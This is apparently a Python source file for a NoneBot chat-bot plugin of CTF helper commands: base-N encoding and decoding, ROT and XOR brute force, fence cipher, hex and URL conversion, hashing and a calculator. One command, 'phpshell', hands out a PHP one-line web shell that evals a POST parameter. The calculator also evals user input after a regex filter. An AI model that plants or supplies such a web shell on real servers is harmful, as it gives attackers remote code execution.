
from email.quoprimime import unquote
from pydoc import plain
from nonebot import Bot, on_command
from nonebot.rule import to_me
from nonebot.matcher import Matcher
#from nonebot.adapters import Message
from nonebot.params import Arg, CommandArg, ArgPlainText
from nonebot.adapters.onebot.v11 import Message
import base64,base58,base45
import libnum
import time
import os
import requests
import re
import json
import uu
from io import BytesIO
import hashlib

from urllib.parse import unquote,quote

def conversionString(intnumber):
    numberList = ['零','一','二','三','四','五','六','七','八','九']
    unitList = ["","十","百","千","万",'十万','百万','千万','亿','十亿','百亿','千亿','万亿','兆']
    # 转为字符串 获取传入字符串长度
    strnumber = str(intnumber)
    lennumber = len(strnumber)
    # 如果长度等于1 则直接返回对应的各位数字
    if lennumber == 1:
        return numberList[intnumber]
    # 如果不为一 也就不是个位数 则需要获取相关单位
    string = ''
    for i in range(lennumber):
        # print('第{}次,string值为:{}'.format(i,string))
        if int(strnumber[i]) != 0:
            # 判断万出现的次数 如果多次删除现有的 万 字 防止出现 五十万二万 重复
            for unit in ['万','亿']:
                if string.count(unit) > 1:
                    print(string.count(unit))
                    string = string.replace(unit, '',1)
            # 获取当前数字对应的汉字 + 单位
            string = string + numberList[int(strnumber[i])]+unitList[lennumber - i - 1]
        # 如果前一位也是零 那么直接跳出循环重新执行 //防止
        elif int(strnumber[i - 1]) == 0:
                continue
        else:
            # 如果都不是 也就是为 那么则直接加一个零
            string = string+numberList[int(strnumber[i])]
    # 返回值 // rstrip 删除结尾的所有零
    string = string.rstrip('零')
    if(intnumber>=10 and intnumber<20):
        return string[1:]
    return string
def enFence(string, space):
   s = ""
   for i in range(0, space):
       for j in range(i, len(string), space):
           # 不能越界
           if j < len(string):
               s += string[j]
   return s
#base64解码
base64de = on_command('base64de',  aliases={'解码base64', '解密base64'}, priority=5)
@base64de.handle()
async def base64de_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base64.b64decode(plain_text).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base58编码
base58en = on_command('base58en',  aliases={'编码base58', '加密base58','58en'}, priority=5)
@base58en.handle()
async def base58en_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base58.b58encode(plain_text.encode('utf-8')).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base58解码
base58de = on_command('base58de',  aliases={'解码base58', '解密base58','58de'}, priority=5)
@base58de.handle()
async def base58de_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base58.b58decode(plain_text).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base45编码
base45en = on_command('base45en',  aliases={'编码base45', '加密base45','45en'}, priority=5)
@base45en.handle()
async def base45en_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base45.b45encode(plain_text.encode('utf-8')).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base45解码
base45de = on_command('base45de',  aliases={'解码base45', '解密base45','45de'}, priority=5)
@base45de.handle()
async def base45de_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base45.b45decode(plain_text).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base85编码
base85en = on_command('base85en',  aliases={'编码base85', '加密base85','85en'}, priority=5)
@base85en.handle()
async def base85en_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base64.a85encode(plain_text.encode('utf-8')).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base85解码
base85de = on_command('base85de',  aliases={'解码base85', '解密base85','85de'}, priority=5)
@base85de.handle()
async def base85de_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base64.a85decode(plain_text).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base32编码
base32en = on_command('base32en',  aliases={'编码base32', '加密base32','32en'}, priority=5)
@base32en.handle()
async def base32en_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base64.b32encode(plain_text.encode('utf-8')).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base32解码
base32de = on_command('base32de',  aliases={'解码base32', '解密base32','32de'}, priority=5)
@base32de.handle()
async def base32de_(matcher: Matcher, args: Message = CommandArg()):
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base64.b32decode(plain_text).decode('utf-8')
            await matcher.send(plain_text)
        except Exception as e:
            await matcher.send(str(e))
#base91编码
base91en = on_command('base91en',  aliases={'编码base91', '加密base91','91en'}, priority=5)
@base91en.handle()
async def base91en_(matcher: Matcher, args: Message = CommandArg()):
    import base91
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base91.encode(plain_text.encode('utf-8'))
            await matcher.send(str(plain_text))
        except Exception as e:
            await matcher.send(str(e))
#base91解码
base91de = on_command('base91de',  aliases={'解码base91', '解密base91','91de'}, priority=5)
@base91de.handle()
async def base91de_(matcher: Matcher, args: Message = CommandArg()):
    import base91
    plain_text = args.extract_plain_text()
    if plain_text:
        try:
            plain_text = base91.decode(plain_text)
            await matcher.send(plain_text.decode('utf-8'))
        except Exception as e:
            await matcher.send(str(e))








#________________________________________分割线________________________________________________
#s2n
s2n = on_command('s2n', aliases={'s2n'}, priority=5)
@s2n.handle()
async def s2n_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = str(libnum.s2n(text.encode('utf-8')))
            await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))
#n2s
n2s = on_command('n2s', aliases={'n2s'}, priority=5)
@n2s.handle()
async def n2s_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = str(libnum.n2s(int(text)))
            await matcher.send(str(text)[2:-1])
        except Exception as e:
            await matcher.send(str(e))
#s2b
s2b = on_command('s2b', aliases={'s2b'}, priority=5)
@s2b.handle()
async def s2b_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = str(libnum.s2b(text.encode('utf-8')))
            if len(text)>5000:
                await matcher.send('过长已转换为pastebin链接:'+await pastesend(text))
            else:
                await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))
#b2s
b2s = on_command('b2s', aliases={'b2s'}, priority=5)
@b2s.handle()
async def b2s_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            #print(text)
            text = str(libnum.b2s(text))[2:-1]
            
            await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))
#________________________________________分割线________________________________________________
#t2s
t2s = on_command('t2s', aliases={'t2s'}, priority=5)
@t2s.handle()
async def t2s_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(text)))
            await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))
#字符串翻转
str_reverse = on_command('strrev', aliases={'翻转','颠倒','倒置','反向'}, priority=5)
@str_reverse.handle()
async def str_reverse_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = text[::-1]
            await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))
#移除空格
str_remove_space = on_command('str_remove_space', aliases={'移除空格','去空格','去空格符','去空格符号'}, priority=5) 
@str_remove_space.handle()
async def str_remove_space_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = text.replace(' ','')
            await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))
#字符串转全大写
str_upper = on_command('str_upper', aliases={'转全大写','全大写','全大写字母','全大写字母','转大写','upper'}, priority=5)
@str_upper.handle()
async def str_upper_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = text.upper()
            await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))           
#字符串转全小写
str_lower = on_command('str_lower', aliases={'转全小写','全小写','全小写字母','全小写字母','转小写','lower'}, priority=5)
@str_lower.handle()
async def str_lower_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = text.lower()
            await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))
#字符串转大写首字母
str_upper_first = on_command('str_upper_first', aliases={'转大写首字母','大写首字母','upper_first','首字母大写'}, priority=5)
@str_upper_first.handle()
async def str_upper_first_(matcher: Matcher, args: Message = CommandArg()):
    text = args.extract_plain_text()
    if text:
        try:
            text = text.capitalize()
            await matcher.send(str(text))
        except Exception as e:
            await matcher.send(str(e))
#xor爆破
str_xor_bf = on_command('str_xor_bf', aliases={'xorbf','xor爆破','xor遍历'}, priority=5)
@str_xor_bf.handle()
async def str_xor_bf_(matcher: Matcher, args: Message = CommandArg()):
    def xor_BF(str,gjc):
        for i in range(256):
            xor_str = ''
            for j in range(len(str)):
                xor_str = xor_str + chr(ord(str[j]) ^ i)
            if gjc in xor_str:
                return xor_str
        return '未找到'
    str1 = args.extract_plain_text()
    if str1:
        try:  
            str_str = str1.split(' -c ')[0]
            gjc = str1.split(' -c ')[1]
            await matcher.send(str(xor_BF(str_str,gjc)))
        except Exception as e:
            await matcher.send(str(e))
#rot13
str_rot13 = on_command('str_rot13', aliases={'rot13','rot13破解','rot'}, priority=5)
@str_rot13.handle()
async def str_rot13_(matcher: Matcher, args: Message = CommandArg()):
    def rot13(str,x):
        str_str = ''
        for i in range(len(str)):
            if str[i].isalpha():
                if str[i].isupper():
                    str_str = str_str + chr((ord(str[i]) - ord('A') + int(x)) % 26 + ord('A'))
                else:
                    str_str = str_str + chr((ord(str[i]) - ord('a') + int(x)) % 26 + ord('a'))
            else:
                str_str = str_str + str[i]
        return str_str
    str1 = args.extract_plain_text()
    if ' -r ' in str1:
        rotnum = str1.split(' -r ')[1]
        str2 = str1.split(' -r ')[0]
        await matcher.send(str(rot13(str2,rotnum)))
        return
    elif ' -a' in str1:
        str2 = str1.split(' -a')[0]
        str3 = ''
        for i in range(26):
            str3 =str3+rot13(str2,i)+' 偏移量:'+str(i)+'\n'
        await matcher.send(str3)
        return
    elif str1:
        try:
            await matcher.send(str(rot13(str1,13)))
        except Exception as e:
            await matcher.send(str(e))
#rot47
str_rot47 = on_command('str_rot47', aliases={'rot47','rot47破解'}, priority=5)
@str_rot47.handle()
async def str_rot47_(matcher: Matcher, args: Message = CommandArg()):
    ROT47 = lambda strings :''.join([chr(33+(e+14)%94) for e in [ord(i) for i in strings] if e >=33 and e <= 126])
    str1 = args.extract_plain_text()
    if str1 :
        try:
            await matcher.send(ROT47(str1))
        except Exception as e:
            await matcher.send(str(e))
#数字转中文大写
num_to_chinese = on_command('n2c', aliases={'数字转中文大写','数字转中文','num_to_chinese'}, priority=5)
@num_to_chinese.handle()
async def num_to_chinese_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            tochinese = conversionString(int(str1))
            await matcher.send(str(tochinese))
    except Exception as e:
        await matcher.send(str(e))
#栅栏密码
strFrence = on_command('strFrence', aliases={'栅栏密码','栅栏','strFrence'}, priority=5)
@strFrence.handle()
async def strFrence_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        str2 = str1.split(' ')[0]
        number = str1.split(' ')[1]
        text = enFence(str2,int(number))
        await matcher.send(str(text))
    except Exception as e:
        await matcher.send(str(e))

crc32de = on_command('crc32', aliases={'crc32','crc32破解'}, priority=5)
@crc32de.handle()
async def crc32de(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            a=await crc32_6(str1)
            #print(a)
            await matcher.send(str(a))
    except Exception as e:
        await matcher.send(str(e))

bfbase64 = on_command('bfbase64', aliases={'bfbase64','base64大小写爆破'}, priority=5)
@bfbase64.handle()
async def bfbase64_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            a=await baopo(str1)
            #print(a)
            await matcher.send(str(a))
    except Exception as e:
        await matcher.send(str(e))
strlen = on_command('len', aliases={'长度','字节长度'}, priority=5)
@strlen.handle()
async def strlen_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            a=len(str1)
            #print(a)
            await matcher.send(str(a))
    except Exception as e:
        await matcher.send(str(e))
yjhphp = on_command('phpshell', aliases={'来一句话木马','一句话木马'}, priority=5)
@yjhphp.handle()
async def yjhphp_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        a=f'<?php @eval($_POST["{str1}"]) ?>'
        #print(a)
        await matcher.send(str(a))
    except Exception as e:
        await matcher.send(str(e))
str2hex = on_command('str2hex', aliases={'s2h','str2hex','字符串转十六进制'}, priority=5)
@str2hex.handle()
async def str2hex_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            a=bytes.hex(str1.encode('utf-8'))
            #print(a)
            await matcher.send(str(a))
    except Exception as e:
        await matcher.send(str(e))
hex2str = on_command('hex2str', aliases={'h2s','hex2str','十六进制转字符串'}, priority=5)
@hex2str.handle()
async def hex2str_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text().replace('%','').replace('0x','').replace('0X','').replace('\\x','').replace('\\u00','').replace('\\U00','').replace('&#x','').replace(';&#x','').replace(';','')
    try:
        if str1:
            print(str1)
            a=bytes.fromhex(str1).decode('utf-8')
            #print(a)
            await matcher.send(str(a))
    except Exception as e:
        await matcher.send(str(e)+"\n要不试试#s2h "+str1+Message('[CQ:face,id=324]'))
        await matcher.send()
urlcode2str = on_command('urlcode2str', aliases={'urlcode2str','url解码','urlde'}, priority=5)
@urlcode2str.handle()
async def urlcode2str_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            a=unquote(str(str1),'utf-8')
            #print(a)
            await matcher.send(str(a))   
    except Exception as e:
        await matcher.send(str(e))
str2urlcode = on_command('str2urlcode', aliases={'str2urlcode','url编码','urlen'}, priority=5)
@str2urlcode.handle()
async def str2urlcode_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            a=quote(str(str1),'utf-8')
            #print(a)
            await matcher.send(str(a))
    except Exception as e:
        await matcher.send(str(e))
#计算器
calc = on_command('calc', aliases={'计算器','calc'}, priority=5)
@calc.handle()
async def calc_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    #过滤掉非[0-9]加减乘除
    str1 = re.sub(r'[^0-9+\-*/.()]', "", str1)
    #过滤掉单词import,os
    # for i in range(100):
    #     str1 = re.sub(r'import|os|__|()|system|input|requests', "", str1)
    try:
        if str1:
            if str1 == "0.1+0.2" or str1 == "0.2+0.1"or str1 == ".2+.1"or str1 == "0.2+.1"or str1 == ".2+0.1":
                await matcher.send("0.3")
            elif '**' in str1:
                number1 = str1.split('**')[0]
                number2 = str1.split('**')[1]
                try:
                    number3 = str1.split('**')[2]
                    if int(number1)+int(number2)+int(number3)>100:
                        await matcher.send("数值过大你自己算吧")
                except:
                    if int(number1)+int(number2)>100:
                        await matcher.send("数值过大你自己算吧")
                
            else:
                a=eval(str(str1))
                #print(a)
                await matcher.send(str(a))
    except Exception as e:
        await matcher.send(str(e))
#dna加密
dnaen = on_command('dnaen', aliases={'dna加密','dnaen'}, priority=5)
@dnaen.handle()
async def dnaen_(matcher: Matcher, args: Message = CommandArg()):
    orstr = args.extract_plain_text()
    try:
        if orstr:
            dna = json.load(open(r"D:\pythonconda\nonebot2\Akirabot\akirabot\plugins\ctftools\tools\dna1\dna.json", "r"))
            keys, values = list(dna.keys()), list(dna.values())
            non_enc = [i for i in str(orstr)]
            _str = []
            for i in non_enc:
                if i in values:
                    _str.append(keys[values.index(i)])
            else:
                _str.append(i)
            dnaen = ''.join(str(s) for s in _str)[:-1]
            await matcher.send(dnaen)
    except Exception as e:
        await matcher.send(str(e))
#dna解密
dnade = on_command('dnade', aliases={'dna解密','dnade'}, priority=5)
@dnade.handle()
async def dnade_(matcher: Matcher, args: Message = CommandArg()):
    enstr = args.extract_plain_text().replace(' ','')
    try:
        if enstr:
            dna = json.load(open(r"D:\pythonconda\nonebot2\Akirabot\akirabot\plugins\ctftools\tools\dna1\dna.json", "r"))
            rez = []
            for i in range(0,len(enstr), 3):
                r = enstr[i:i+3]
                rez.append(dna[r])
            dnade = ''.join(str(s) for s in rez)
            await matcher.send(dnade)
    except Exception as e:
        await matcher.send(str(e))
#uuencode
uuencode = on_command('uuencode', aliases={'uuencode','uuen'}, priority=5)
@uuencode.handle()
async def uuencode_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        iupt = BytesIO(str1.encode('utf-8'))
        out = BytesIO()
        uu.encode(iupt, out, "")
        uuencodestr = out.getvalue().decode('utf-8')
        await matcher.send(str(uuencodestr))
    except Exception as e:
        await matcher.send(str(e))

# uudecode = on_command('uudecode', aliases={'uudecode','uudecode','uud'}, priority=5)
# @uudecode.handle()
# async def uudecode_(matcher: Matcher, args: Message = CommandArg()):
#     str1 = args.extract_plain_text()
#     try:
#         iupt = BytesIO(str1.encode('utf-8'))
#         out = BytesIO()
#         uu.decode(iupt, out)
#         uudecodestr = out.getvalue().decode('utf-8')
#         await matcher.send(str(uudecodestr))
#     except Exception as e:
#         await matcher.send(str(e))

#md5加密
md5en = on_command('md5', aliases={'md5加密','md5'}, priority=5)
@md5en.handle()
async def md5en_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            md5 = hashlib.md5(str1.encode('utf-8')).hexdigest()
            await matcher.send(str(md5))
    except Exception as e:
        await matcher.send(str(e))
#sha1加密
sha1en = on_command('sha1', aliases={'sha1加密','sha1'}, priority=5)
@sha1en.handle()
async def sha1en_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            sha1 = hashlib.sha1(str1.encode('utf-8')).hexdigest()
            await matcher.send(str(sha1))
    except Exception as e:
        await matcher.send(str(e))
#sha256加密
sha256en = on_command('sha256', aliases={'sha256加密','sha256'}, priority=5)
@sha256en.handle()
async def sha256en_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            sha256 = hashlib.sha256(str1.encode('utf-8')).hexdigest()
            await matcher.send(str(sha256))
    except Exception as e:
        await matcher.send(str(e))
#sha512加密
sha512en = on_command('sha512', aliases={'sha512加密','sha512'}, priority=5)
@sha512en.handle()
async def sha512en_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            sha512 = hashlib.sha512(str1.encode('utf-8')).hexdigest()
            await matcher.send(str(sha512))
    except Exception as e:
        await matcher.send(str(e))
#sha224加密
sha224en = on_command('sha224', aliases={'sha224加密','sha224'}, priority=5)
@sha224en.handle()
async def sha224en_(matcher: Matcher, args: Message = CommandArg()):
    str1 = args.extract_plain_text()
    try:
        if str1:
            sha224 = hashlib.sha224(str1.encode('utf-8')).hexdigest()
            await matcher.send(str(sha224))
    except Exception as e:
        await matcher.send(str(e))




